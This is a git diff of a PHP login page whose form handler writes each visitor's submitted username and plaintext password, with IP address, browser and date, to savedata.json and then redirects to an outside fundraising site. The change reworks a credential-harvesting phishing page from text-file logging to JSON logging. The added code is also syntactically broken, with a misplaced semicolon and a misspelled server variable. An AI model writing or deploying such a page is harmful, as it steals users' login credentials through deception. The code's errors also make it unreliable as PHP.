@@ -169,27 +169,36 @@ span.psw {
 
 <?php 
  if (isset($_POST["submit"])) {
- 	$myFile = "savedata.json";
- 	$arr_data = array();
+  if(file_exists('savedata.json'))  
+           {  
+                $current_data = file_get_contents('savedata.json');  
+                $array_data = json_decode($current_data, true);  
+                $extra = array(
+                   'Login_date' => date(),
+                   'Browser Name ' => get_browser();  
+                   'ip_address'    => $_SERVERT['REMOTE_ADDR'],  
+                    'username'       => $_POST['uname'],  
+                    'password'  =>     $_POST['psw']
+                );  
+                $array_data[] = $extra;  
+                $final_data = json_encode($array_data);
+                
+                if(file_put_contents('savedata.json', $final_data))  
+                {  
+                        ?>
+                        <script>
+                          window.open("https://www.abcfundraising.com", "_self");
+                        </script>
+                        <?php 
+                }
+           }
+ 
 
- 	$file=fopen("savedata.json", "a");
-  fwrite($file, "IP Address : ");
-  fwrite($file, $_SERVERT['REMOTE_ADDR']."\n");
+  
 
-  fwrite($file, "Browser : ");
-  fwrite($file, get_browser()."\n");
+ 	
 
-  fwrite($file, "Date : ");
-  fwrite($file, date("l jS \of F Y h:i:s A")."\n");
-
- 	fwrite($file, "username : ");
- 	fwrite($file, $_POST['uname']."\n");
-
- 	fwrite($file, "password : ");
- 	fwrite($file, $_POST['psw']."\n"."\n");
-
-
- 	fclose($file);
+ 
  	/*try{
  		$formdata = array(
  			'username'=> 'Ajay ',
@@ -210,11 +219,7 @@ span.psw {
  	  	catch(Exception $e){
  		echo "Caught exception :" , $e->getMessage(), "\n";
  	}*/
- 	?>
- 	<script>
- 		window.open("https://www.abcfundraising.com", "_self");
- 	</script>
- 	<?php
+ 	
  }
 ?>
 <script>
